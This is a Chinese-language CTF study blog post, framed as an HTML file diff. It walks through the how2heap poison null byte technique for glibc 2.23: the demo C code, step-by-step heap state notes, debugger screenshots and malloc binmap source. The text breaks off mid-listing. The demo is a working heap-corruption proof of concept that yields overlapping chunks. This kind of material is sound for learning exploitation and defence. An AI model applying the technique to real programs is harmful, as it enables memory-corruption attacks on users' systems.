@@ -1,0 +1,1535 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('http://yoursite.com').hostname,
+    root: '/',
+    scheme: 'Muse',
+    version: '7.7.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="how2heap - poison_null_byte&amp;plaiddbubuntu16.04 libc2.23 poison_null_byte.c12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656">
+<meta property="og:type" content="article">
+<meta property="og:title" content="how2heap - poison_null_byte&amp;plaiddb">
+<meta property="og:url" content="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/index.html">
+<meta property="og:site_name" content="Coldshiel&#39;s blog">
+<meta property="og:description" content="how2heap - poison_null_byte&amp;plaiddbubuntu16.04 libc2.23 poison_null_byte.c12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/1581064511575.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/1581064709879.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/1581064849626.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/1581132885745.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/1581132905008.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/1581133887238.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/1581144994741.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/1581151294350.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/1581152010623.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/1581134255040.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/1581139383559.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/1581227038307.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/1581227277632.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/1581237156090.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/1581257799309.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/1581258154196.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/1581258239453.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/1581258527364.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/1581258539173.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/1581258784894.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/1581260525230.png">
+<meta property="article:published_time" content="2020-02-10T14:54:41.000Z">
+<meta property="article:modified_time" content="2020-02-29T10:08:54.517Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="how2heap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/1581064511575.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>how2heap - poison_null_byte&plaiddb | Coldshiel's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Coldshiel's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Coldshiel's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          how2heap - poison_null_byte&plaiddb
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-02-10 06:54:41" itemprop="dateCreated datePublished" datetime="2020-02-10T06:54:41-08:00">2020-02-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-02-29 02:08:54" itemprop="dateModified" datetime="2020-02-29T02:08:54-08:00">2020-02-29</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="how2heap-poison-null-byte-amp-plaiddb"><a href="#how2heap-poison-null-byte-amp-plaiddb" class="headerlink" title="how2heap - poison_null_byte&amp;plaiddb"></a>how2heap - poison_null_byte&amp;plaiddb</h1><p>ubuntu16.04 libc2.23</p>
+<h1 id="poison-null-byte-c"><a href="#poison-null-byte-c" class="headerlink" title="poison_null_byte.c"></a>poison_null_byte.c</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Welcome to poison null byte 2.0!\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Tested in Ubuntu 14.04 64bit.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint8_t</span>* a;</span><br><span class="line">	<span class="keyword">uint8_t</span>* b;</span><br><span class="line">	<span class="keyword">uint8_t</span>* c;</span><br><span class="line">	<span class="keyword">uint8_t</span>* b1;</span><br><span class="line">	<span class="keyword">uint8_t</span>* b2;</span><br><span class="line">	<span class="keyword">uint8_t</span>* d;</span><br><span class="line">	<span class="keyword">void</span> *barrier;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We allocate 0x100 bytes for 'a'.\n"</span>);</span><br><span class="line">	a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"a: %p\n"</span>, a);</span><br><span class="line">	<span class="keyword">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Since we want to overflow 'a', we need to know the 'real' size of 'a' "</span></span><br><span class="line">		<span class="string">"(it may be more than 0x100 because of rounding): %#x\n"</span>, real_a_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span></span><br><span class="line"><span class="comment">	 * the least significant byte of this will be 0x10, because the size of the chunk includes</span></span><br><span class="line"><span class="comment">	 * the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">	b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b: %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line">	c = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"c: %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n"</span></span><br><span class="line">		<span class="string">"The barrier is not strictly necessary, but makes things less confusing\n"</span>, barrier);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span></span><br><span class="line">	<span class="comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span></span><br><span class="line">	<span class="comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span></span><br><span class="line">	<span class="comment">//*(size_t*)(b+0x1f0) = 0x200;</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"In newer versions of glibc we will need to have our updated size inside b itself to pass "</span></span><br><span class="line">		<span class="string">"the check 'chunksize(P) != prev_size (next_chunk(P))'\n"</span>);</span><br><span class="line">	<span class="comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span></span><br><span class="line">	<span class="comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span></span><br><span class="line">	*(<span class="keyword">size_t</span>*)(b+<span class="number">0x1f0</span>) = <span class="number">0x200</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// this technique works by overwriting the size metadata of a free chunk</span></span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b.size is: (0x200 + 0x10) | prev_in_use\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We overflow 'a' with a single null byte into the metadata of 'b'\n"</span>);</span><br><span class="line">	a[real_a_size] = <span class="number">0</span>; <span class="comment">// &lt;--- THIS IS THE "EXPLOITED BUG"</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint64_t</span>* c_prev_size_ptr = ((<span class="keyword">uint64_t</span>*)c)<span class="number">-2</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"c.prev_size is %#lx\n"</span>,*c_prev_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// This malloc will result in a call to unlink on the chunk where b was.</span></span><br><span class="line">	<span class="comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span></span><br><span class="line">	<span class="comment">// will detect the heap corruption now.</span></span><br><span class="line">	<span class="comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span></span><br><span class="line">	<span class="comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span></span><br><span class="line">	<span class="comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span></span><br><span class="line">	<span class="comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n"</span>,</span><br><span class="line">		*((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>)), *(<span class="keyword">size_t</span>*)(b<span class="number">-0x10</span> + *((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>))));</span><br><span class="line">	b1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b1: %p\n"</span>,b1);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we malloc 'b1'. It will be placed where 'b' was. "</span></span><br><span class="line">		<span class="string">"At this point c.prev_size should have been updated, but it was not: %#lx\n"</span>,*c_prev_size_ptr);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Interestingly, the updated value of c.prev_size has been written 0x10 bytes "</span></span><br><span class="line">		<span class="string">"before c.prev_size: %lx\n"</span>,*(((<span class="keyword">uint64_t</span>*)c)<span class="number">-4</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We malloc 'b2', our 'victim' chunk.\n"</span>);</span><br><span class="line">	<span class="comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span></span><br><span class="line"></span><br><span class="line">	b2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b2: %p\n"</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(b2,<span class="string">'B'</span>,<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Current b2 content:\n%s\n"</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(b1);</span><br><span class="line">	<span class="built_in">free</span>(c);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Finally, we allocate 'd', overlapping 'b2'.\n"</span>);</span><br><span class="line">	d = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"d: %p\n"</span>,d);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now 'd' and 'b2' overlap.\n"</span>);</span><br><span class="line">	<span class="built_in">memset</span>(d,<span class="string">'D'</span>,<span class="number">0x300</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"New b2 content:\n%s\n"</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks"</span></span><br><span class="line">		<span class="string">"for the clear explanation of this technique.\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>大致意思如下：程序首先malloc了四个small chunk（这里我写的是实际大小）接着进行如下操作：</p>
+<p><code>0x110（a）    0x210（b）    0x110（c）    0x110（barrier）</code></p>
+<ol>
+<li>在b chunk的0x200偏移处写上了0x200</li>
+<li><code>free(b)</code>，设置c.prev_size=0x210，c.size=0x110（此时b chunk被置入unsorted bin）</li>
+<li>通过a的溢出将b.size由0x211改为0x200</li>
+<li><code>b1=malloc(0x100)</code>，将b分割出b1（如果不在之前设置fake prev_size，分割时调用unlink会出错）</li>
+<li><code>b2=malloc(0x80)//victim chunk</code></li>
+<li><code>free(b1)</code>b1被free之后在下一步<code>free(c)</code>时即可通过unlink的检查<code>FD-&gt;bk != P || BK-&gt;fd != P</code></li>
+<li><code>free(c)</code>,由于c.prev_size在之前被设置成了0x210，c.size为0x110，所以这个free会将前0x210size的chunk一起合并</li>
+<li><code>d=malloc(0x300)</code>，此时d与b2 overlap</li>
+</ol>
+<h2 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h2><p>debug的时候实在是受不了pwndbg里面heap的非hex显示了，于是自己去改了一下pwndbg的脚本（然后被安利了pwngdb和pwndocker，准备这个题写完就去看看）</p>
+<p>在pwndbg/pwndbg/commands目录下的heap.py文件里面，找到<code>malloc_chunk</code>函数，然后替换一下注释掉的那行即可：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#print(header, chunk["value"])</span></span><br><span class="line">    print(header,<span class="string">'&#123;'</span>)</span><br><span class="line">    print(<span class="string">'  prev_size   = '</span>+hex(chunk[<span class="string">'prev_size'</span>]).ljust(<span class="number">15</span>,chr(<span class="number">0x20</span>)),<span class="string">'size        = '</span>+hex(chunk[<span class="string">'size'</span>]))</span><br><span class="line">    print(<span class="string">'  fd          = '</span>+hex(chunk[<span class="string">'fd'</span>]).ljust(<span class="number">15</span>,chr(<span class="number">0x20</span>)),<span class="string">'bk          = '</span>+hex(chunk[<span class="string">'bk'</span>]))</span><br><span class="line">    print(<span class="string">'  fd_nextsize = '</span>+hex(chunk[<span class="string">'fd_nextsize'</span>]).ljust(<span class="number">15</span>,chr(<span class="number">0x20</span>)),<span class="string">'bk_nextsize = '</span>+hex(chunk[<span class="string">'bk_nextsize'</span>]))</span><br><span class="line">    print(<span class="string">'&#125;'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>gdb.Value object里面的直接打印的话是十进制显示的一些值，看起来没那么方便，自己可以按照喜欢的格式改一下脚本</p>
+<p><strong>第3步执行之后：</strong></p>
+<p><img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581064511575.png" alt="1581064511575"></p>
+<p>ps：这里可以看出来pwndbg的heap显示是根据堆上的size偏移来计算chunk地址的，所以修改size之后会出现这种错位的现象</p>
+<p><strong>第5步执行之后：</strong></p>
+<img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581064709879.png" width="70%" height="70%">
+
+<p><strong>第6步执行之后：</strong></p>
+<img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581064849626.png" width="70%" height="70%">
+
+<p>b1会被再次放入unsorted bin当中，此时b1是在正常bin链上，当然也具备unlink检查的条件</p>
+<p>ps：注意第7步执行之后，本来是unlink了b1这个堆块，但是free时会把合并后的堆块再放入unsortedbin，所以在gdb下查看第七步执行之后的bins中unsortedbin是没有变的（毕竟b1和b的首地址时一样的）</p>
+<p><strong>第8步执行过程</strong></p>
+<p>我调试了很久很久，主要是搭了glibc源码的调试环境然后撸了很久的malloc源码</p>
+<p>因为在第八步执行前heap上和chunk的情况是这样的：</p>
+<img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581132885745.png" width="60%" height="60%">
+
+<p>但是执行之后变成了这样：</p>
+<img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581132905008.png" width="55%" height="55%">
+
+<p>小的被分割出来的chunk被放入了smallbins，然后<code>malloc(0x300)</code>返回出来的chunk是合并后0x320字节的chunk，照理来说应该是0x310才对，如果是对0x320的chunk进行了切割，剩下的0x10字节是&lt;<code>MINSIZE</code>的，所以得看分配时是不是发生了哪种fit，最后在撸了源码之后，参考xman师傅发的堆ppt看到了这个（不愧是师傅们的总结，tql），不过师傅们的总结这里，unsorted bin大小满足分配需求、剩余大小&lt;<code>MINSIZE</code>时在我这里似乎并不是直接取，因为我撸源码时，里面判断&gt;<code>MINSIZE</code>不成立时直接就把unsortedbin中最后一个块取下来了。</p>
+<p><img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581133887238.png" alt="1581133887238"></p>
+<img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581144994741.png" width="55%" height="55%">
+
+<p><strong>ps:</strong>再就是直接从unsortedbin取chunk要满足上图中未打框的四个条件，这里在第4步<code>malloc(0x100)分割出b1</code>，实际上不是从unsortedbin b直接切出来的，是先把这个chunk放入了对应的smallbins，然后再从smallbins切出来的，剩下的快由于大于<code>MINSIZE</code>，所以再被链入了unsortedbin，此时last_remainder才被初始化（对应剩下的块），看上去b1好像是直接从unsortedbin b直接切出来的实际上不是<em>（所以这里再立个 flag，自己找时间把malloc的全流程稍微详细的写一遍）</em>，所以我发现分割之后的两个chunk中fd和bk不一样，如下(last_remainder也在第一次分割chunk后初始化)：</p>
+<img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581151294350.png" width="70%" height="70%">
+
+<p><img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581152010623.png" alt="1581152010623"></p>
+<p><em>如上，首先被链入smallbins</em></p>
+<p>回到第八步，ptmalloc源码分析那本PDF里面也写到了best-fit相关：</p>
+<img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581134255040.png" width="60%" height="60%">
+
+<p>此时从对应smallbins中对应下标（0x310-&gt;0x31）的下一个下标（0x320-&gt;0x32）开始找，这里补一个binmap的知识点</p>
+<h2 id="binmap-amp-一些流程"><a href="#binmap-amp-一些流程" class="headerlink" title="binmap&amp;一些流程"></a>binmap&amp;一些流程</h2><p>在x64下binmap同样是4个Dword（4*32）</p>
+<img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581139383559.png" width="80%" height="80%">
+
+<p>利用binmap找到best-fit chunk的具体代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="comment">/* Skip rest of block if there are no more set bits in this block. */</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">bit</span> &gt; <span class="built_in">map</span> || <span class="built_in">bit</span> == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">				<span class="keyword">goto</span> use_top;</span><br><span class="line">		&#125; <span class="keyword">while</span> ( (<span class="built_in">map</span> = av-&gt;binmap[block]) == <span 